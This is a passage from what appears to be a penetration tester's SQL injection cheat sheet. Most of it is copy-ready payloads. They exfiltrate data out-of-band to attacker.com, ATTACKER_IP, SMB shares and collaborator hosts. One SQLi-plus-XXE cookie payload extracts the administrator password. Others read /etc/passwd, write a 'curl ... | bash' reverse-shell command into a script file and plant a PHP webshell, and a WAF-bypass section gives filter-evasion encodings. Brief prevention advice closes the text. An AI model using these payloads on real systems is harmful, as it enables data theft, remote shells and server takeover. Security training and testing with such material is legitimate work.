EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\10.10.58.187\logs\out.txt" -c -T';
# Alternatively, OPENROWSET or BULK INSERT can be used to interact with external data sources, facilitating data exfiltration through OOB channels.
# Oracle
DECLARE
  req UTL_HTTP.REQ;
  resp UTL_HTTP.RESP;
BEGIN
  req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data);
  UTL_HTTP.GET_RESPONSE(req);
END;


# On trackingID cookie, using SQLi + XXE
TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.OASTIFY.COM/">+%25remote%3b]>'),'/l')+FROM+dual--
'
# Additional SQLi payload with XML for reference with || the SQL concatenation operator to concatenate two expressions that evaluate two character data types or to numeric data type and do some obfuscating.  
'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % fuzz SYSTEM "http://OASTI'||'FY.COM/">%fuzz;]>'),'/l') from dual)||'


# HTTP requests (MySQL and MariaDB needs UDF to be created and installed to support HTTP requests)
SELECT http_post('http://attacker.com/exfiltrate', sensitive_data) FROM books;
# DNS Exfiltration (MySQL does not natively support it so attackers might use UDFs or system-level scripts to perform DNS lookups.
# SMB Exfiltration / first start SMB server to host the exfiltration and then trigger it with a payload
smbserver.py -smb2support -comment "My Logs Server" -debug logs /tmp
SELECT sensitive_data INTO OUTFILE '\\\\10.10.162.175\\logs\\out.txt';
1'; SELECT @@version INTO OUTFILE '\\\\ATTACKER_IP\\logs\\out.txt'; --
```
{% endcode %}

{% code overflow="wrap" %}
```sql
https://requestbin.io

The attack channel could be a web request, and the data gathering channel could be monitoring HTTP/DNS requests made to a service you control.
'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual)-- -

# Another way: a query inside a query
http://website.com/user?id=152 union select "1 order by 4 -- -",2,3 from information_schema.tables where table_schema=database()
http://10.10.115.182/user?id=1337%20union%20select%20%221%20union%20select%201,flag,3,4%20from%20flag%20--%20-%22,2,3%20from%20information_schema.tables%20where%20table_schema=database()
```
{% endcode %}

## Stacked Queries

```sql
search=value;SELECT SLEEP(5)#
```

## Subquery / Double Query

{% code overflow="wrap" fullWidth="true" %}
```sql
1' and (select 1 from (Select count(*),Concat((<Your Query here to return single row>),0x3a,floor(rand (0) *2))y from information_schema.tables group by y) x)-- -
1' and (select 1 from (Select count(*),Concat((select database()),0x3a,floor(rand(0)*2))y from information_schema.tables group by y) x)-- -
1' and (select 1 from (Select count(*),Concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a,floor(rand(0)*2))y from information_schema.tables group by y) x)-- -
```
{% endcode %}

## SQL injection in different contexts

{% code overflow="wrap" fullWidth="true" %}
```sh
# For example, some websites take input in JSON or XML format and use this to query the database. 
# The following XML-based SQL injection uses an XML escape sequence (HTML Entity) to encode the S character in SELECT
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```
{% endcode %}

## Read / write files

{% code overflow="wrap" fullWidth="true" %}
```sh
# READ FILES
' UNION SELECT 1,2,@@version,load_file('/etc/passwd') -- - '~/.bash_history
# READ PHP FILES
to_base64(load_file("")) 

#### WRITE FILES
# confirm if we can write files
SELECT @@secure_file_priv
SHOW VARIABLES LIKE 'secure_file_priv';
# Then write a file to get revshell using curl | bash
;select "curl 10.10.10.190/revshell |bash;" INTO OUTFILE  '/data/scripts/dbstatus.json';
# TO UPLOAD PHP INTO A FILE OF THE WEB SERVER (NEED TO GUESS DOCUMENT ROOT SUCH AS /var/www/html or C:\XXX)
' UNION SELECT 1,2,"<?php whatever ?>" into outfile "/var/www/html/file.php"-- -   '
admin@admin.com' union select null,null,null,null,'<?php system($_GET["cmd"]); ?>',null into outfile '/var/www/html/webshell.php' -- -
```
{% endcode %}

## Command Injection

```sql
' UNION SELECT NULL,sys_eval('whoami') FROM users-- -
```

## WAF Bypass - Filter Evasion Techniques

### Hackvertor

Use Hackvertor to bypass WAFs using html entities, hex entities and so on. For example:

{% code overflow="wrap" fullWidth="true" %}
```
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>
```
{% endcode %}

<pre class="language-sql" data-full-width="true"><code class="lang-sql">https://portswigger.net/research/bypassing-wafs-and-cracking-xor-with-hackvertor
<strong>Try hex encode for example
</strong>
field='value',field2=value&#x26;field3=value # URL encode first part

# In case a keyword is blocked -> linefeed 
keyword\n=this or keyword%0A=this
<strong>
</strong><strong># URL encoding
</strong>' OR 1=1-- can be encoded as %27%20OR%201%3D1--
Another way of representing OR can be ||
# Hexadecimal encoding
SELECT * FROM users WHERE name = 'admin' can be encoded as SELECT * FROM users WHERE name = 0x61646d696e
# Unicode encoding (scape ASCII filters)
admin can be encoded as \u0061\u0064\u006d\u0069\u006e

# No-Quote SQL Injection
instead of ' OR '1'='1 use OR 1=1
admin'-- can be transformed into admin--
CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e) constructs the string admin

# No Spaces Allowed
# Comments to replace spaces -> SELECT * FROM users WHERE name = 'admin'
SELECT/**//*FROM/**/users/**/WHERE/**/name/**/='admin'
# Tab or Newline
SELECT\t*\tFROM\tusers\tWHERE\tname\t=\t'admin'
# Alternate caracters
 %09 (horizontal tab), %0A (line feed), %0C (form feed), %0D (carriage return), and %A0 (non-breaking space)
Instead of 1' OR 1=1 --        1'%0A||%0A1=1%0A--%27+
</code></pre>

| Scenario                                                 | Description                                                                                                      | Example                                                                                                        |
| -------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------- |
| Keywords like SELECT are banned                          | SQL keywords can often be bypassed by changing their case or adding inline comments to break them up             | SElEcT \* FrOm users or SE/\*\*/LECT \* FROM/\*\*/users                                                        |
| Spaces are banned                                        | Using alternative whitespace characters or comments to replace spaces can help bypass filters.                   | SELECT%0A\*%0AFROM%0Ausers or SELECT/\*\*/\*/\*\*/FROM/\*\*/users                                              |
| Logical operators like AND, OR are banned                | Using alternative logical operators or concatenation to bypass keyword filters.                                  | username = 'admin' && password = 'password' or username = 'admin'/\*\*/\|\|/\*\*/1=1 --                        |
| Common keywords like UNION, SELECT are banned            | Using equivalent representations such as hexadecimal or Unicode encoding to bypass filters.                      | SElEcT \* FROM users WHERE username = CHAR(0x61,0x64,0x6D,0x69,0x6E)                                           |
| Specific keywords like OR, AND, SELECT, UNION are banned | Using obfuscation techniques to disguise SQL keywords by combining characters with string functions or comments. | SElECT \* FROM users WHERE username = CONCAT('a','d','m','i','n') or SElEcT/\*\*/username/\*\*/FROM/\*\*/users |

## Other Techniques

{% code fullWidth="true" %}
```sql
# HTTP Header Injection -> manipulating HTTP headers (like User-Agent, Referer, or X-Forwarded-For)
User-Agent: ' OR 1=1; --
User-Agent: ' UNION SELECT username, password FROM user; --
User-Agent: ' UNION SELECT username, password FROM user; # 

'# Exploiting Stored Procedures -> they could be vulnerable to SQLi if not properly sanitized
CREATE PROCEDURE sp_getUserData
    @username NVARCHAR(50)
AS
BEGIN
    DECLARE @sql NVARCHAR(4000)
    SET @sql = 'SELECT * FROM users WHERE username = ''' + @username + ''''
    EXEC(@sql)
END

# XML and JSON Injection 
{
  "username": "admin' OR '1'='1--",
  "password": "password"
}
```
{% endcode %}

## Automation

```
https://github.com/sqlmapproject/sqlmap
https://github.com/xxgrunge/sqlninja
https://github.com/43622283/jsql-injection
https://github.com/CiscoCXSecurity/bbqsql
```

## Best Practices

Exploiting Database-Specific Feature&#x73;**:** understand the specifics of the target DBMS (e.g., MySQL, PostgreSQL, Oracle, MSSQL)

**Leveraging Error Messages**: Exploit verbose error messages to gain insights into the database schema and structure. For example, using 1' AND 1=CONVERT(int, (SELECT @@version)) -- can generate errors that leak version information.

**Bypassing WAF and Filters**: mixed case (SeLeCt), concatenation (CONCAT(CHAR(83), CHAR(69), CHAR(76), CHAR(69), CHAR(67), CHAR(84))), and alternate encodings (hex, URL encoding). Additionally, using inline comments (/\*\*/) and different character encodings (e.g., %09, %0A) can help bypass simple filters.

**Database Fingerprinting**: For instance, SELECT version() works on PostgreSQL, while SELECT @@version works on MySQL and MSSQL.

**Pivoting with SQL Injection**: Use SQL injection to pivot and exploit other parts of the network. Once a database server is compromised, it can be used to gain access to other internal systems. This might involve extracting credentials or exploiting trust relationships between systems.

{% code fullWidth="true" %}
```sql
########## SECURE CODERS
# Prepared Statements and Parameterized queries
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username"); $stmt->execute(['username' => $username]);
# Input Validation and Sanitisation
Use built-in functions such as htmlspecialchars() and filter_var() in PHP to sanitise inputs effectively.
# Least Privilege Principle: grant application accounts the minimum necessary database permissions and avoid using privileged accounts for everyday utasks
# Stored Procedures: Encapsulate and validate SQL logic using stored procedures.
# Regular Security Audits and Code Reviews
```
{% endcode %}

## concat, group\_concat, encoding

```sql
# CONCAT REGISTERS OF A FIELD
concat(username,0x3a,password)
group_concat(schema_name)
group_concat(password)
concat(table_name, ', ')
```

## Comment Injection Attack

[https://owasp.org/www-community/attacks/Comment\_Injection\_Attack](https://owasp.org/www-community/attacks/Comment_Injection_Attack)

## Fuzzing parameters

/usr/share/wfuzz/wordlist/vulns/sql\_inj.txt

## Mitigations

* **Input validation:** Sanitise and validate all user-supplied input to ensure it adheres to expected data types and formats. Reject any input that doesn't meet validation criteria.
* **Parameterised statements:** Use prepared statements and parameterised queries in your database interactions. Parameterised queries automatically escape user input, making it difficult for attackers to inject malicious SQL.
* **Stored procedures:** Use stored procedures to encapsulate your SQL logic whenever possible. This reduces the risk of SQL injection by separating user input from SQL code.

{% code overflow="wrap" fullWidth="true" %}
```sql
# How to prevent SQL injection
# Vulnerable
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
# using parameterized queries / prepared statements
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
# Use them where untrusted input, including the WHERE clause and values in an INSERT or UPDATE statement
# For other parts of the query, such as table or column names, or the ORDER BY clause
    Whitelisting permitted input values.
    Using different logic to deliver the required behavior.
```
{% endcode %}
